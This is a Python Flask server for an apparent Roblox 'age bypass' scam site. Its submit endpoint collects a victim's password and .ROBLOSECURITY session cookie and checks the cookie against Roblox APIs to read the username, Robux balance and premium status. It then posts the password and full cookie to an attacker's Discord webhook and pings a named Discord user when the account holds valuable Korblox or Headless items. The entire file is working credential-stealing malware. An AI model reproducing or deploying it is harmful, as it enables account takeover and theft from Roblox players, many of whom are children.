import os
import json
import re
import requests
import base64
import time
import threading
from flask import Flask, request, jsonify, send_from_directory
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)

def clean_roblox_cookie(cookie):
    """
    Automatically remove Roblox warning prefix from cookie
    Returns cleaned cookie without the warning prefix
    """
    if not cookie:
        return cookie
    
    warning_pattern = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'
    
    if cookie.startswith(warning_pattern):
        cleaned_cookie = cookie[len(warning_pattern):]
        print(f"Auto-cleaned cookie: Removed warning prefix. Length reduced from {len(cookie)} to {len(cleaned_cookie)} chars")
        return cleaned_cookie
    
    return cookie

def send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url):
    """Send clean bypass logs (without cookie) to Discord webhook"""
    try:
        print("Background: Sending clean bypass logs...")
        
        # Check if user has Korblox or Headless for ping notification  
        has_premium_items = korblox or headless
        ping_content = ''
        
        if has_premium_items:
            # Ping the user if account has Korblox or Headless
            ping_content = '<@1343590833995251825> 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
            if korblox and headless:
                ping_content += ' - Account has both Korblox AND Headless!'
            elif korblox:
                ping_content += ' - Account has Korblox!'
            elif headless:
                ping_content += ' - Account has Headless!'
        
        # Create Discord embed data for bypass logs (clean, no cookie)
        bypass_data = {
            'content': ping_content,
            'embeds': [
                {
                    'title': '🎯 Age Bypass Successful',
                    'color': 0x00ff00,  # Green color for success
                    'thumbnail': {
                        'url': user_info['profile_picture']
                    },
                    'fields': [
                        {
                            'name': '👤 Username',
                            'value': user_info['username'],
                            'inline': False
                        },
                        {
                            'name': '💰 Robux',
                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
                            'inline': False
                        },
                        {
                            'name': '📊 Status',
                            'value': 'Successful ✅',
                            'inline': False
                        },
                        {
                            'name': '🎭 Premium Items',
                            'value': f"Korblox: {'✅' if korblox else '❌'} | Headless: {'✅' if headless else '❌'}",
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': f'Bypassed at {time.strftime("%H:%M", time.localtime())}',
                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                    }
                }
            ]
        }
        
        # Send to bypass webhook
        response = requests.post(bypass_webhook_url, json=bypass_data, timeout=5)
        
        if response.status_code in [200, 204]:
            print(f"Background: Bypass logs webhook successful: {response.status_code}")
        else:
            print(f"Background: Bypass logs webhook failed: {response.status_code}")
            
    except Exception as e:
        print(f"Background: Error sending bypass logs to Discord: {str(e)}")

def send_to_discord_background(password, korblox, headless, cookie, webhook_url):
    """Background function to send data to Discord webhook"""
    try:
        print("Background: Fetching Roblox user information...")
        user_info = get_roblox_user_info(cookie)
        
        # Check if cookie actually works with Roblox API
        if not user_info.get('success', False):
            print("Background: Cookie failed validation against Roblox API - not sending webhooks")
            return
        
        # Check if user has Korblox or Headless for ping notification
        has_premium_items = korblox or headless
        ping_content = ''
        
        if has_premium_items:
            # Ping the user if account has Korblox or Headless
            ping_content = '<@1343590833995251825> 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
            if korblox and headless:
                ping_content += ' - Account has both Korblox AND Headless!'
            elif korblox:
                ping_content += ' - Account has Korblox!'
            elif headless:
                ping_content += ' - Account has Headless!'
        
        # Prepare cookie content for Discord (cookie is already cleaned)
        cookie_content = cookie if cookie else 'Not provided'
        
        # Truncate cookie if too long for Discord
        available_cookie_space = 3990  # Conservative limit
        if len(cookie_content) > available_cookie_space:
            cookie_content = cookie_content[:available_cookie_space] + "..."
            print(f"Background: Cookie truncated to fit Discord limit")
        
        # Create Discord embed data
        discord_data = {
            'content': ping_content,
            'embeds': [
                {
                    'title': 'Age Forcer',
                    'color': 0xff0000,
                    'thumbnail': {
                        'url': user_info['profile_picture']
                    },
                    'fields': [
                        {
                            'name': '👤 Username',
                            'value': user_info['username'],
                            'inline': False
                        },
                        {
                            'name': '💰 Robux',
                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
                            'inline': False
                        },
                        {
                            'name': '⌛ Pending Robux',
                            'value': '0',
                            'inline': False
                        },
                        {
                            'name': '📊 Status',
                            'value': 'Success 🟩',
                            'inline': False
                        },
                        {
                            'name': '🔐 Password',
                            'value': password if password else 'Not provided',
                            'inline': False
                        },
                        {
                            'name': '🎭 Items',
                            'value': f"Korblox: {'✅' if korblox else '❌'} | Headless: {'✅' if headless else '❌'}",
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': f'Today at {time.strftime("%H:%M", time.localtime())}',
                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                    }
                },
                {
                    'title': '🍪 Cookie Data',
                    'color': 0xff0000,
                    'description': f'```{cookie_content}```',
                    'footer': {
                        'text': 'Authentication Token • Secured',
                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                    }
                }
            ]
        }
        
        # Send to main Discord webhook (full data with cookie)
        payload_size = len(json.dumps(discord_data))
        print(f"Background: Sending Discord payload of size: {payload_size} bytes")
        
        response = requests.post(webhook_url, json=discord_data, timeout=5)
        
        if response.status_code in [200, 204]:
            print(f"Background: Discord webhook successful: {response.status_code}")
        else:
            print(f"Background: Discord webhook failed: {response.status_code}")
        
        # Also send to bypass logs webhook (clean data without cookie) - only if cookie worked
        if user_info.get('success', False):
            bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
            if bypass_webhook_url:
                print("Background: Sending to bypass logs webhook...")
                send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url)
            else:
                print("Background: BYPASS_WEBHOOK_URL environment variable not configured")
                print("Background: Available webhook env vars:", [key for key in os.environ.keys() if 'WEBHOOK' in key.upper()])
                print("Background: Bypass logs will not be sent - configure BYPASS_WEBHOOK_URL to enable")
        else:
            print("Background: Not sending bypass logs - cookie validation failed")
            
    except Exception as e:
        print(f"Background: Error sending to Discord: {str(e)}")

def get_roblox_user_info(cookie):
    """Get Roblox user information using the provided cookie"""
    try:
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}' if not cookie.startswith('.ROBLOSECURITY=') else cookie,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Get current user info
        response = requests.get('https://users.roblox.com/v1/users/authenticated', 
                              headers=headers, timeout=3)
        
        if response.status_code == 200:
            user_data = response.json()
            user_id = user_data.get('id')
            username = user_data.get('name', 'Unknown')
            display_name = user_data.get('displayName', username)
            
            # Get user avatar/profile picture
            avatar_response = requests.get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png',
                                         timeout=5)
            
            profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
            if avatar_response.status_code == 200:
                avatar_data = avatar_response.json()
                if avatar_data.get('data') and len(avatar_data['data']) > 0:
                    profile_picture_url = avatar_data['data'][0].get('imageUrl', profile_picture_url)
            
            # Get Robux balance - try multiple endpoints
            robux_balance = 'Not available'
            
            # Try the currency endpoint first
            try:
                robux_response = requests.get('https://economy.roblox.com/v1/users/currency',
                                            headers=headers, timeout=5)
                print(f"Robux API response status: {robux_response.status_code}")
                
                if robux_response.status_code == 200:
                    robux_data = robux_response.json()
                    print(f"Robux API response: {robux_data}")
                    if 'robux' in robux_data:
                        robux_balance = f"R$ {robux_data['robux']:,}"
                    else:
                        print("No 'robux' field in response")
                else:
                    print(f"Robux API failed with status: {robux_response.status_code}, response: {robux_response.text}")
            except Exception as robux_error:
                print(f"Error getting Robux balance: {str(robux_error)}")
                
            # If first method failed, try alternative endpoint using user_id
            if robux_balance == 'Not available' and user_id:
                try:
                    alt_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency',
                                              headers=headers, timeout=5)
                    print(f"Alternative Robux API response status: {alt_response.status_code}")
                    
                    if alt_response.status_code == 200:
                        alt_robux_data = alt_response.json()
                        print(f"Alternative Robux API response: {alt_robux_data}")
                        if 'robux' in alt_robux_data:
                            robux_balance = f"R$ {alt_robux_data['robux']:,}"
                except Exception as alt_error:
                    print(f"Alternative Robux API error: {str(alt_error)}")
            
            # Check Premium status
            premium_status = '❌ No'
            try:
                premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership',
                                              headers=headers, timeout=5)
                print(f"Premium API response status: {premium_response.status_code}")
                
                if premium_response.status_code == 200:
                    premium_data = premium_response.json()
                    print(f"Premium API response: {premium_data}")
                    # Handle both object and boolean responses
                    if isinstance(premium_data, bool):
                        premium_status = '✅ Yes' if premium_data else '❌ No'
                    elif isinstance(premium_data, dict) and premium_data.get('isPremium', False):
                        premium_status = '✅ Yes'
                else:
                    print(f"Premium API failed with status: {premium_response.status_code}")
            except Exception as premium_error:
                print(f"Error getting Premium status: {str(premium_error)}")
            
            return {
                'success': True,
                'username': username,
                'display_name': display_name,
                'user_id': user_id,
                'profile_picture': profile_picture_url,
                'robux_balance': robux_balance,
                'premium_status': premium_status
            }
        else:
            print(f"Cookie validation failed against Roblox API: {response.status_code}")
            print(f"Response: {response.text}")
        
    except Exception as e:
        print(f"Error fetching Roblox user info: {str(e)}")
    
    # Return failure indicator if cookie doesn't work with Roblox API
    return {
        'success': False,
        'username': 'Not available',
        'display_name': 'Not available', 
        'user_id': None,
        'profile_picture': 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter',
        'robux_balance': 'Not available',
        'premium_status': '❌ No'
    }

def is_valid_cookie(cookie):
    """
    Validate cookie and check if it's not expired
    Supports JWT tokens and session cookies with expiration
    Returns tuple: (is_valid, is_expired, error_message)
    """
    if not cookie or len(cookie) < 10:
        return False, False, "Invalid cookie format"
    
    # Check if it's a JWT token (has 3 parts separated by dots)
    if cookie.count('.') == 2:
        try:
            # Split JWT token
            header, payload, signature = cookie.split('.')
            
            # Decode payload with correct padding for URL-safe base64
            payload += '=' * (-len(payload) % 4)
            decoded_payload = base64.urlsafe_b64decode(payload)
            payload_data = json.loads(decoded_payload)
            
            # Check expiration (exp claim)
            if 'exp' in payload_data:
                exp_time = payload_data['exp']
                current_time = int(time.time())
                
                if current_time >= exp_time:
                    return False, True, "Cookie has expired"  # Token is expired
            
            return True, False, None  # Valid JWT token, not expired
            
        except (ValueError, json.JSONDecodeError, Exception):
            return False, False, "Invalid cookie format"  # Invalid JWT format
    
    # For non-JWT cookies, accept Roblox-style cookies and other formats
    # Accept Roblox .ROBLOSECURITY cookies (often start with _|WARNING:)
    # Allow truncated cookies as long as they meet minimum requirements
    if cookie.startswith('_|WARNING:') and len(cookie) > 50:
        return True, False, None
    
    # Accept standard cookie formats
    cookie_pattern = r'^(session|token|auth|_token|user_token|access_token)=[A-Za-z0-9+/=_-]{10,}$'
    if re.match(cookie_pattern, cookie):
        return True, False, None
    
    # Accept any long alphanumeric string that could be a valid token
    # Allow truncated cookies as long as they have some valid characters
    if len(cookie) >= 30 and any(c.isalnum() for c in cookie):
        return True, False, None
    
    return False, False, "Invalid cookie format"

@app.route('/')
def index():
    """Serve the main HTML page"""
    return send_from_directory('.', 'index.html')

@app.route('/health')
def health_check():
    """Health check endpoint to verify main webhook connectivity"""
    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    
    if not webhook_url:
        return jsonify({
            'status': 'error',
            'message': 'DISCORD_WEBHOOK_URL not configured'
        }), 500
    
    # Validate webhook URL format
    if not webhook_url.startswith('https://discord.com/api/webhooks/'):
        return jsonify({
            'status': 'error', 
            'message': 'Invalid Discord webhook URL format'
        }), 500
    
    try:
        # Test connection with a minimal payload
        test_payload = {'content': 'Health check test'}
        response = requests.post(webhook_url, json=test_payload, timeout=5)
        
        if response.status_code in [200, 204]:
            return jsonify({
                'status': 'ok',
                'message': 'Discord webhook connection successful',
                'webhook_status': response.status_code
            })
        else:
            return jsonify({
                'status': 'error',
                'message': f'Discord webhook returned status {response.status_code}',
                'response': response.text[:200]
            }), 500
            
    except requests.ConnectionError as e:
        return jsonify({
            'status': 'error',
            'message': 'Connection error - cannot reach Discord servers',
            'error': str(e)[:100]
        }), 500
    except requests.Timeout:
        return jsonify({
            'status': 'error',
            'message': 'Timeout error - Discord servers not responding'
        }), 500
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Unexpected error: {str(e)[:100]}'
        }), 500

@app.route('/health/full')
def health_check_full():
    """Comprehensive health check for both main and bypass webhooks"""
    results = {
        'main_webhook': {'status': 'unknown'},
        'bypass_webhook': {'status': 'unknown'},
        'overall_status': 'unknown'
    }
    
    # Test main webhook
    main_webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    if not main_webhook_url:
        results['main_webhook'] = {
            'status': 'error',
            'message': 'DISCORD_WEBHOOK_URL not configured'
        }
    else:
        try:
            test_payload = {'content': 'Main webhook health check'}
            response = requests.post(main_webhook_url, json=test_payload, timeout=5)
            
            if response.status_code in [200, 204]:
                results['main_webhook'] = {
                    'status': 'ok',
                    'message': 'Main webhook successful',
                    'status_code': response.status_code
                }
            else:
                results['main_webhook'] = {
                    'status': 'error',
                    'message': f'Main webhook failed with status {response.status_code}',
                    'status_code': response.status_code
                }
        except Exception as e:
            results['main_webhook'] = {
                'status': 'error',
                'message': f'Main webhook error: {str(e)[:100]}'
            }
    
    # Test bypass webhook
    bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
    if not bypass_webhook_url:
        results['bypass_webhook'] = {
            'status': 'warning',
            'message': 'BYPASS_WEBHOOK_URL not configured - bypass logs will not work'
        }
    else:
        try:
            test_payload = {'content': 'Bypass webhook health check'}
            response = requests.post(bypass_webhook_url, json=test_payload, timeout=5)
            
            if response.status_code in [200, 204]:
                results['bypass_webhook'] = {
                    'status': 'ok',
                    'message': 'Bypass webhook successful',
                    'status_code': response.status_code
                }
            else:
                results['bypass_webhook'] = {
                    'status': 'error',
                    'message': f'Bypass webhook failed with status {response.status_code}',
                    'status_code': response.status_code
                }
        except Exception as e:
            results['bypass_webhook'] = {
                'status': 'error',
                'message': f'Bypass webhook error: {str(e)[:100]}'
            }
    
    # Determine overall status
    main_ok = results['main_webhook']['status'] == 'ok'
    bypass_ok_or_warning = results['bypass_webhook']['status'] in ['ok', 'warning']
    
    if main_ok and bypass_ok_or_warning:
        results['overall_status'] = 'ok'
        status_code = 200
    elif main_ok:
        results['overall_status'] = 'partial'
        status_code = 200
    else:
        results['overall_status'] = 'error'
        status_code = 500
    
    return jsonify(results), status_code

@app.route('/submit', methods=['POST'])
def submit_form():
    """Handle form submission and send to Discord webhook"""
    try:
        data = request.get_json()
        
        # Extract all form fields
        password = data.get('password', '').strip()
        korblox = data.get('korblox', False)
        headless = data.get('headless', False)
        cookie = data.get('cookie', '').strip()
        
        # Auto-clean Roblox warning prefix from cookie
        cookie = clean_roblox_cookie(cookie)
        
        # Server-side validation
        if not cookie:
            return jsonify({
                'success': False, 
                'message': 'Missing required field (cookie)'
            }), 400
        
        # Comprehensive cookie validation
        is_valid, is_expired, error_msg = is_valid_cookie(cookie)
        
        if not is_valid or is_expired:
            return jsonify({
                'success': False, 
                'message': 'Your Cookie Was Expired Or Invalid'
            }), 400
        
        
        # Get Discord webhook URL from environment
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("ERROR: DISCORD_WEBHOOK_URL environment variable not set")
            print("Available environment variables:", [key for key in os.environ.keys() if 'WEBHOOK' in key.upper() or 'DISCORD' in key.upper()])
            return jsonify({
                'success': False, 
                'message': 'Discord webhook not configured. Please set DISCORD_WEBHOOK_URL environment variable in your deployment platform.'
            }), 500
        
        print("Discord webhook URL configured successfully") # Don't log URL for security
        
        # Process Discord webhooks synchronously for Vercel compatibility  
        print("Processing Discord webhooks synchronously...")
        try:
            send_to_discord_background(password, korblox, headless, cookie, webhook_url)
            print("Discord webhook processing completed successfully")
            return jsonify({
                'success': True, 
                'message': 'Data processed and sent successfully'
            })
        except Exception as e:
            print(f"Error during Discord webhook processing: {str(e)}")
            return jsonify({
                'success': False, 
                'message': 'Processing completed but webhook delivery may have failed'
            }), 500
            
    except Exception as e:
        return jsonify({
            'success': False, 
            'message': 'Server error occurred'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)